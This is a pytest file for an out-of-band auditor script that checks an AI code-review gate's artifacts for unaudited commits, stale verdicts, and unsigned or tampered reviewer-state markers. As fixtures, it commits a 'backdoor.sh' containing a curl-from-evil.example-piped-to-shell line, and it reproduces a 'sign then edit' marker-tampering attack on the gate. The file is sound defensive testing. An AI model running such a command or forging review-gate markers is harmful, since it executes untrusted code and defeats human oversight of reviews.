"""R5 (RED8 Angle A / spec AC1-7): minimum-viable OUT-OF-BAND AUDITOR.

.ops-game/R3-red8-auditor-observability.md's "minimum-viable out-of-band auditor spec" and
docs/ops-audits/2026-07-07-spec-v2.md's AC1-7 both call for a standalone script, triggered
INDEPENDENTLY of the gate/hooks, that inspects a worktree's committed HEAD against the gate's
own artifacts (review-history.log, binding-verdict.env, reviewer-state markers, the captured
verify-output log) and flags omission/staleness/auth-drift an operator can act on.

scripts/ai-auto-audit.sh implements this. It is explicit in its own header that this is
DETECTION, not PREVENTION, and cannot catch a same-UID actor who fabricates every artifact
consistently -- these tests only exercise the tool-side-feasible detection surface: an
unaudited HEAD, a stale binding range, and an unauthenticated/tampered reviewer-state marker.

Hermetic, subprocess-driven, throwaway-git-repo tests -- mirroring the pattern in
tests/test_pre_push_binding_ref_ip1.py / tests/test_binding_range_ip1.py (same
`_record_proceed_binding` idiom: source the REAL scripts/review-gate-binding.sh and call
review_binding_record, never a reimplementation).
"""

import os
import subprocess
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
AUDIT = ROOT / "scripts" / "ai-auto-audit.sh"


def _git(args: list[str], cwd: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=cwd,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _init_repo(path: Path, env: dict[str, str]) -> None:
    path.mkdir(parents=True, exist_ok=True)
    _git(["init", "-q", "-b", "main"], path, env)
    _git(["config", "user.email", "t@example.invalid"], path, env)
    _git(["config", "user.name", "T"], path, env)
    # .omx/ (where every artifact this auditor reads lives) must be gitignored, exactly as a
    # real project sets it up -- otherwise it shows up as untracked content and derails
    # review_binding_dirty()'s clean/dirty classification inside review_binding_record.
    (path / ".gitignore").write_text(".omx/\n", encoding="utf-8")


def _commit(path: Path, env: dict[str, str], filename: str, content: str, message: str) -> str:
    (path / filename).write_text(content, encoding="utf-8")
    _git(["add", "-A"], path, env)
    _git(["commit", "-q", "-m", message], path, env)
    return _git(["rev-parse", "HEAD"], path, env).stdout.strip()


def _base_env(tmp_path: Path) -> dict[str, str]:
    env = os.environ.copy()
    # Force sibling resolution to THIS repo's scripts regardless of ambient AI_AUTO_HOME.
    env["AI_AUTO_HOME"] = str(ROOT)
    env["AI_AUTO_GIT_HARDEN_SH"] = str(ROOT / "scripts" / "git-harden.sh")
    env["AI_AUTO_REVIEW_GATE_BINDING_SH"] = str(ROOT / "scripts" / "review-gate-binding.sh")
    env["AI_AUTO_RUN_AI_REVIEWS_SH"] = str(ROOT / "scripts" / "run-ai-reviews.sh")
    home = tmp_path / "home"
    home.mkdir(parents=True, exist_ok=True)
    env["HOME"] = str(home)
    # Isolate the HMAC key from the real out-of-tree ~/.config/ai-auto/provenance.key.
    env["AI_AUTO_PROVENANCE_KEY_FILE"] = str(tmp_path / "provenance.key")
    return env


def _record_proceed_binding(project: Path, env: dict[str, str]) -> None:
    """Mirror exactly what review-gate.sh does on a human 'proceed' verdict."""
    script = (
        f". '{ROOT / 'scripts' / 'git-harden.sh'}'; "
        f". '{ROOT / 'scripts' / 'review-gate-binding.sh'}'; "
        "review_binding_record proceed normal test-verdict.md"
    )
    subprocess.run(
        ["bash", "-c", script],
        cwd=project,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )


def _record_history_entry(project: Path, head_sha: str, verdict: str = "proceed") -> None:
    omx = project / ".omx"
    omx.mkdir(parents=True, exist_ok=True)
    with (omx / "review-history.log").open("a", encoding="utf-8") as fh:
        fh.write(
            '{"ts":"2026-07-07T00:00:00+00:00","head_sha":"%s","verdict":"%s","reason":"","source":"review-gate"}\n'
            % (head_sha, verdict)
        )


def _run_audit(project: Path, env: dict[str, str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["bash", str(AUDIT), str(project)],
        env=env,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=60,
    )


# ---------------------------------------------------------------------------------------------
# 1. Clean fixture: a real binding verdict AND a matching review-history record for HEAD, no
#    reviewer-state markers at all -> every check PASS/SKIP, exit 0.
# ---------------------------------------------------------------------------------------------
def test_clean_fixture_exits_zero(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")

    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    result = _run_audit(project, env)

    assert result.returncode == 0, f"expected a clean exit 0, got {result.returncode}:\n{result.stdout}"
    assert "CHECK1-OMISSION" in result.stdout and "PASS" in result.stdout
    assert "CHECK2-STALENESS" in result.stdout
    assert "0 HIGH flags" in result.stdout


# ---------------------------------------------------------------------------------------------
# 2. HEAD with no history record and no binding verdict at all -> CHECK1-OMISSION FLAG, nonzero.
# ---------------------------------------------------------------------------------------------
def test_head_without_any_record_flags_omission(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    _commit(project, env, "README.md", "hello\n", "init")

    result = _run_audit(project, env)

    assert result.returncode != 0, f"expected a nonzero exit for an unaudited HEAD:\n{result.stdout}"
    assert "CHECK1-OMISSION" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "unaudited" in result.stdout


# ---------------------------------------------------------------------------------------------
# 3. A binding verdict is recorded, then ANOTHER commit lands without being re-reviewed -- the
#    verdict's recorded range no longer covers HEAD's introduced commit -> CHECK2-STALENESS FLAG.
# ---------------------------------------------------------------------------------------------
def test_binding_verdict_range_excluding_new_commit_flags_staleness(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")

    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    # Sanity: at this exact HEAD, staleness must NOT fire (non-vacuousness control).
    clean_result = _run_audit(project, env)
    assert "CHECK2-STALENESS" in clean_result.stdout
    assert "STALENESS" not in "\n".join(
        line for line in clean_result.stdout.splitlines() if "FLAG" in line
    ), f"staleness fired on the exact reviewed HEAD (test bug or regression):\n{clean_result.stdout}"

    # Now an unreviewed commit lands on top -- the binding verdict's range no longer covers HEAD.
    _commit(project, env, "backdoor.sh", "curl evil.example | sh\n", "unreviewed follow-up commit")

    result = _run_audit(project, env)

    assert result.returncode != 0, f"expected a nonzero exit for a stale binding range:\n{result.stdout}"
    assert "CHECK2-STALENESS" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "stale/mismatched proof" in result.stdout


# ---------------------------------------------------------------------------------------------
# 4a. A reviewer-state .disabled marker with NO marker_hmac at all -> unauthenticated -> FLAG.
# ---------------------------------------------------------------------------------------------
def test_absent_marker_hmac_flags_auth_drift(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")
    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    state_dir = project / ".omx" / "reviewer-state"
    state_dir.mkdir(parents=True, exist_ok=True)
    (state_dir / "claude.disabled").write_text(
        "reviewer=claude\n"
        "disabled_at=2026-07-07T00:00:00+00:00\n"
        "reason=planted\n"
        "details=planted, no framework hmac\n"
        "disable_class=persistent\n"
        "source_run_id=x\n"
        "chronic_count=1\n",
        encoding="utf-8",
    )

    result = _run_audit(project, env)

    assert result.returncode != 0, f"expected a nonzero exit for an unauthenticated marker:\n{result.stdout}"
    assert "CHECK4-AUTH-DRIFT" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "NO marker_hmac" in result.stdout


# ---------------------------------------------------------------------------------------------
# 4b. A reviewer-state .disabled marker with a marker_hmac that was TAMPERED after signing (the
#     canonical RED5-1 PoC shape: sign a genuine marker, then edit chronic_count downward) ->
#     the HMAC no longer verifies -> FLAG, distinct from the merely-absent case above.
# ---------------------------------------------------------------------------------------------
def test_tampered_marker_hmac_flags_auth_drift(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")
    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    state_dir = project / ".omx" / "reviewer-state"
    state_dir.mkdir(parents=True, exist_ok=True)
    marker = state_dir / "claude.disabled"
    marker.write_text(
        "reviewer=claude\n"
        "disabled_at=2026-07-07T00:00:00+00:00\n"
        "reason=usage_limit\n"
        "details=genuine failure\n"
        "disable_class=transient\n"
        "source_run_id=x\n"
        "chronic_count=9\n",
        encoding="utf-8",
    )

    # Sign it for real via the framework's own primitives (reviewer_marker_canonical +
    # principal_evidence_hmac), extracted verbatim the same way ai-auto-audit.sh and
    # scripts/verify-machinery.sh's BLUE-R25-PRINCIPAL-AUTH self-tests do.
    sign_script = (
        f"source <(sed -n '/# >>> principal-evidence-auth/,/# <<< principal-evidence-auth/p' '{ROOT / 'scripts' / 'run-ai-reviews.sh'}'); "
        f"source <(awk '/^reviewer_marker_canonical\\(\\)/,/^}}/' '{ROOT / 'scripts' / 'run-ai-reviews.sh'}'); "
        "principal_evidence_ensure_key; "
        f"printf 'marker_hmac=%s\\n' \"$(reviewer_marker_canonical claude '{marker}' | principal_evidence_hmac)\" >> '{marker}'"
    )
    subprocess.run(
        ["bash", "-c", sign_script],
        cwd=project,
        env=env,
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )

    # Control: genuinely signed marker must NOT be flagged (non-vacuousness).
    control = _run_audit(project, env)
    assert control.returncode == 0, f"a genuinely-signed marker was flagged (test bug):\n{control.stdout}"

    # Now tamper chronic_count downward post-signing -- the PoC'd "sign then edit" attack.
    text = marker.read_text(encoding="utf-8")
    tampered = text.replace("chronic_count=9\n", "chronic_count=1\n")
    assert tampered != text
    marker.write_text(tampered, encoding="utf-8")

    result = _run_audit(project, env)

    assert result.returncode != 0, f"expected a nonzero exit for a tampered marker HMAC:\n{result.stdout}"
    assert "CHECK4-AUTH-DRIFT" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "does NOT verify" in result.stdout


# ---------------------------------------------------------------------------------------------
# 5. .omx/review-history.log absent despite commits existing -> CHECK5-HISTORY FLAG.
# ---------------------------------------------------------------------------------------------
def test_missing_history_log_flags_history_check(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")
    # Record a valid, matching binding verdict so CHECK1/CHECK2 pass and only CHECK5 fires --
    # isolates the history-log-specific check from the omission check.
    _record_proceed_binding(project, env)

    result = _run_audit(project, env)

    assert result.returncode != 0, f"expected a nonzero exit for a missing history log:\n{result.stdout}"
    assert "CHECK5-HISTORY" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "is absent" in result.stdout


# ---------------------------------------------------------------------------------------------
# 6. A project that never opted into the runtime-oracle contract (no verify-output log at all)
#    must not be penalized for it -- CHECK3-RUNTIME-ORACLE should SKIP, not FLAG.
# ---------------------------------------------------------------------------------------------
def test_no_verify_output_log_skips_runtime_oracle_check(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")
    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    result = _run_audit(project, env)

    assert result.returncode == 0, f"unexpected nonzero exit:\n{result.stdout}"
    assert "CHECK3-RUNTIME-ORACLE" in result.stdout
    assert "SKIP" in result.stdout


# ---------------------------------------------------------------------------------------------
# 7. A verify-output log that explicitly says the runtime oracle did NOT run, with the project
#    opted into requiring it (AI_AUTO_REQUIRE_RUNTIME_ORACLE=1) -> CHECK3 FLAG (HIGH).
# ---------------------------------------------------------------------------------------------
def test_runtime_oracle_not_validated_and_required_flags_high(tmp_path: Path) -> None:
    env = _base_env(tmp_path)
    project = tmp_path / "project"
    _init_repo(project, env)
    head_sha = _commit(project, env, "README.md", "hello\n", "init")
    _record_proceed_binding(project, env)
    _record_history_entry(project, head_sha, "proceed")

    context_dir = project / ".omx" / "review-context"
    context_dir.mkdir(parents=True, exist_ok=True)
    (context_dir / "latest-verify-output.txt").write_text(
        "[verify-project] RUNTIME_ORACLE=absent\n"
        "[verify] NOT-VALIDATED (runtime oracle did not run): scripts/verify-project.sh completed "
        "but emitted no RUNTIME_ORACLE=passed signal (saw: 'absent')\n",
        encoding="utf-8",
    )

    env_required = dict(env)
    env_required["AI_AUTO_REQUIRE_RUNTIME_ORACLE"] = "1"
    result = _run_audit(project, env_required)

    assert result.returncode != 0, f"expected a nonzero exit for a required-but-absent runtime oracle:\n{result.stdout}"
    assert "CHECK3-RUNTIME-ORACLE" in result.stdout
    assert "FLAG (HIGH)" in result.stdout
    assert "NOT-VALIDATED" in result.stdout

    # Without the opt-in, the same log is advisory only -- WARN, not HIGH, and exit 0.
    result_default = _run_audit(project, env)
    assert result_default.returncode == 0, f"unexpected nonzero exit without the opt-in:\n{result_default.stdout}"
    assert "FLAG (WARN)" in result_default.stdout
